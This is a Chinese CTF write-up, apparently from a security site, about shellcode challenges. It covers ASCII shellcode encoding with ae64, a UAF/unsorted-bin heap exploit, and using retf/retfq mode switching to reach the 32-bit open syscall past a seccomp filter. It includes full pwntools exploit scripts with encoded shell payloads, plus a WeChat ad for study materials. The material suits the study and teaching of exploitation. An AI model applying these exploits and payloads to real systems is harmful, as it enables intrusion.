网上已经有成熟的工具了，所以就简单记录一下工具怎么用吧

<https://github.com/TaQini/alpha3>

<https://github.com/veritas501/ae64.git>

<https://github.com/rcx/shellcode_encoder>

结合题目来看吧，没有开启NX保护，基本这类型题目九成九都是shellcode题

![image-20230812220258102](https://image.3001.net/images/20230822/1692666753_64e40b81612efd29078ef.png!small)

程序一开始会让我们在`bss`段上输入数据，并且判断输入的字符大小是否小于0x1F，再结合NX保护没开启的操作，很容易可以想到此时输入的就是shellcode，而每个字节的不能小于0x1F，那么使用ASCII码shellcode就可以完全绕过了，因为小于0x1F的都是不可见字符

![image-20230812220502748](https://image.3001.net/images/20230822/1692666754_64e40b827e49ff2106c25.png!small)

接着再来看题目存在的漏洞，题目存在很明显的UAF漏洞

![image-20230812220758365](https://image.3001.net/images/20230822/1692666755_64e40b83762104fdd233a.png!small)

在选项5中则是留有触发shellcode的条件，只要dword_602440不为0则直接指向我们输入的shellcode，而dword_602440位于bss段，因此默认就为0

![image-20230812220848343](https://image.3001.net/images/20230822/1692666756_64e40b845819c47992231.png!small)

而在add函数中，分配堆块又恰好都在unsortbin的范围内，那么思路很清楚了，就是使用unsortbin修改dword_602440的值，那么就能触发shellcode

![image-20230812221039170](https://image.3001.net/images/20230822/1692666757_64e40b852c8b7d0622a85.png!small)

剩下就是shellcode如何绕过0x1F这个限制，可以看到syscal是`\xf\x5`，因此syscal都无法绕过这个限制

![image-20230812221435095](https://image.3001.net/images/20230822/1692666758_64e40b8639aa92d5db372.png!small)

这里使用ae64这个工具

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

首先将需要修改的shellcode以二进制的形式导出，这里直接用pwntools生成的shellcode即可

    
    
    from ae64 import AE64  
    from pwn import *  
    context.arch='amd64'  
    ​  
    # get bytes format shellcode  
    shellcode = asm(shellcraft.sh())  
    ​  
    # get alphanumeric shellcode  
    f = open('shellcode','wb+')  
    f.write(shellcode)  
    f.close()  
    ​

![image-20230812222658159](https://image.3001.net/images/20230822/1692666759_64e40b871bf1c5788398b.png!small)

接着使用ae64的库直接修改为ASCII码shellcode

    
    
    from pwn import *  
    from ae64 import AE64  
    ​  
    context.arch = 'amd64'  
    ​  
    ​  
    obj = AE64()  
    sc = obj.encode(asm(shellcraft.sh()),'rdx')  
    print(sc)  
    ​

这里rdx即为shellcode执行的时候call的寄存器

![image-20230812223222314](https://image.3001.net/images/20230822/1692666759_64e40b87ec401bfd7cb14.png!small)

然后就可以生成shellcode了

![image-20230812223247022](https://image.3001.net/images/20230822/1692666761_64e40b8902416b1bb0d8b.png!small)

紧接着拿这段生成的shellcode就可以绕过了

## exp

    
    
    from pwn import *  
    ​  
    sh = process("./pwn")  
    context(arch='amd64')  
    ​  
    ​  
    def add(size):  
    sh.recvuntil(" choice:")  
    sh.sendline("1")  
    sh.recvuntil(" message?")  
    sh.sendline(str(size))  
    ​  
    def delete(index):  
    sh.recvuntil(" choice:")  
    sh.sendline("2")  
    sh.recvuntil("o be deleted?")  
    sh.sendline(str(index))  
    ​  
    def edit(index,content):  
    sh.recvuntil(" choice:")  
    sh.sendline("3")  
    sh.recvuntil(" be modified?")  
    sh.sendline(str(index))  
    sh.recvuntil("t of the message?")  
    sh.sendline(content)  
    ​  
    def show(index):  
    sh.recvuntil(" choice:")  
    sh.sendline("4")  
    sh.recvuntil(" to be showed?")  
    sh.sendline(str(index))  
    ​  
    def exp():  
    sh.recvuntil(" choice:")  
    sh.sendline("5")  
    payload = "RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZj3TYfi9520t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9200t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP"  
    sh.send(payload)  
    add(0x81)  
    add(0x81)  
    delete(0)  
    edit(0, p64(0) + p64(0x602440 - 0x10))  
    add(0x81)  
    exp()  
    ​  
    ​  
    sh.interactive()

# 机器切换-shellcode

有时候会遇到题目需要同时使用32位shellcode与64位shellcode，那么如何进行机器切换则成为解题的关键。

CS寄存器则是用于标记机器位数的关键寄存器

  * CS=0x33，64位

  * CS=0x23，32位

那么如何修改CS寄存器的值，则需要通过retfq与retf的指令

  * refq，从64位切换到32位

    *         push 0x23; #32位的CS寄存器的值  
        push 0xxx; #需要跳转的地址  
        retfq; #从32位切换到64位

  * ref，从32位切换至64位

    *         push 0x33; #64的CS寄存器的值  
        push 0xxx; #需要跳转的地址  
        retf; #从64位切换到32位

再以一道题目作为例子，保护如下，还是没有开启NX保护

![image-20230812224501848](https://image.3001.net/images/20230822/1692666762_64e40b8a48ea41b4944c1.png!small)

题目漏洞在于，再add函数中可申请11个堆块，而题目中给堆块地址容纳的个数为10，因此申请的第11个堆块的地址则会到length中，从而导致第1个堆块的大小变成了堆块的地址值，造成了堆溢出。

![image-20230812224711955](https://image.3001.net/images/20230822/1692666763_64e40b8b8bb9c0cbd6c80.png!small)

这里有个需要注意的地方是会首先检测存放堆块的位置是否为0，为0才会给该堆块申请的机会，因此第1个堆块的大小必须设置为0，才能够申请到11个堆块。

![image-20230812225143067](https://image.3001.net/images/20230822/1692666764_64e40b8ca96bdbf032b72.png!small)

题目还是用mallopt修改了fastbin的大小为0x10，因此使得无法释放的堆块无法放置到fastbin中，但是mallopt实际是修改了max_global_fast的大小

![image-20230812225341764](https://image.3001.net/images/20230822/1692666766_64e40b8edc49e28f2698e.png!small)

但是题目存在堆溢出漏洞，因此使用修改Unsortbin的bk指针，修改global_max_fast的即可，这样就可以让堆块放进fastbin中了。

并且允许在bss段上输入数据，且该地址刚好在存放堆块地址的上方，因此伪造虚假堆块在该位置就可以完成任意地址写了。

![image-20230812225458229](https://image.3001.net/images/20230822/1692666768_64e40b903e49577b156ec.png!small)

紧接着修改free函数的got表地址为堆块地址，就可以跳转到shellcode中执行，可以看到堆块地址也是具有可执行权限的。

![image-20230812225635212](https://image.3001.net/images/20230822/1692666769_64e40b91547dd95a34d40.png!small)

查看一下禁用了哪些函数，发现只能用read，write以及fstat函数，但是fstat函数对于这道题来说没有用。那么没有open函数，我们就没办法进行orw的利用了。

![image-20230812225852456](https://image.3001.net/images/20230822/1692666771_64e40b9371991ba3b5e1e.png!small)

可以看到fstat函数的64位的系统调用号为5

![image-20230812230046268](https://image.3001.net/images/20230822/1692666772_64e40b9491219de3a4a17.png!small)

但是32位下的系统调用号5为open函数

![image-20230812230125078](https://image.3001.net/images/20230822/1692666773_64e40b958e0f50870d1ac.png!small)

那么如果能切换到32位下执行系统调用为5的系统调用，即可完成open函数的执行，这里就要用到上述的方法使用ref与refq指令完成机器位数的切换。

这里需要注意两个点

（1）在切换为机器位数之后栈顶的地址会被截断为4个字节，因此需要重新调整一下栈顶的地址

![image-20230812230855903](https://image.3001.net/images/20230822/1692666774_64e40b96ae1460d8248da.png!small)

（2）在机器位数切换为32位时，在执行系统调用还是会显示原来的函数，但是这个是gdb显示错误，它实际被修改为open函数了

![image-20230812230929182](https://image.3001.net/images/20230822/1692666776_64e40b98b8c99220e43c7.png!small)

## exp

    
    
    from pwn import *  
    ​  
    #sh = process("./pwn")  
    ​  
    elf = ELF("pwn")  
    ​  
    def user(name,desc):  
    sh.recvuntil("choice:")  
    sh.sendline("0")  
    sh.recvuntil(" name?")        
    sh.send(name)  
    sh.recvuntil("desc?")  
    sh.send(desc)  
    ​  
    def add(size):  
    sh.recvuntil("choice:")  
    sh.sendline("1")  
    sh.recvuntil(" message?")  
    sh.send(str(size))  
    ​  
    def delete(index):  
    sh.recvuntil("choice:")  
    sh.sendline("2")  
    sh.recvuntil(" be deleted?")  
    sh.send(str(index))  
    ​  
    def edit(index, offset, content):  
    sh.recvuntil("choice:")  
    sh.sendline("3")  
    sh.recvuntil("ssage to be modified?")  
    sh.send(str(index))  
    sh.recvuntil("message to be modified?")  
    sh.send(str(offset))  
    sh.recvuntil("ent of the message?")  
    sh.send(content)  
    ​  
    while(1):  
    try:  
    sh = process("./pwn")  
    add(0) #0  
    add(0) #1  
    add(0x60)  
    for i in range(8):  
    add(0x71)  
    delete(1)  
    payload = p64(0)*3 + p64(0x21) + p64(0) + p16(0x37f8 - 0x10)  
    edit(0,0,payload)  
    add(9)  
    delete(2)  
    delete(3)  
    delete(4)  
    delete(5)  
    user('a'*0x10+p64(0)+p64(0x71),'b')  
    target = 0x6020f0   
    payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x71) + p64(target)  
    edit(0,0,payload)  
    add(0x60)#2  
    sh.recvuntil("Ptr: ")  
    addr = int("0x"+sh.recv(6),16)  
    log.info("addr:"+hex(addr))  
    add(0x60)#3  
    edit(3,0,p64(elf.got['free']))  
    payload = asm('push 0x23;push '+hex(addr+9)+';retfq', arch='amd64')  
    payload += asm('mov esp, '+hex(target+0x50)+';push 0x6761;push 0x6c662f2e;push esp;pop ebx; xor ecx,ecx; mov eax,5; int 0x80',arch='i386')  
    payload += asm('push 0x33;push '+hex(addr+0x2b)+';retf')  
    payload += asm('mov rdi,rax; mov rsi,0x602080;mov rdx, 0x100;mov rax, 0;syscall;',arch='amd64')  
    payload += asm('mov rdi,1;mov rax ,1;syscall;',arch='amd64')  
    edit(2,0,payload)  
    edit(0,0,p64(addr))  
    #attach(sh,'b*'+str(addr))  
    delete(6)  
    sh.interactive()  
    except:  
    continue

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

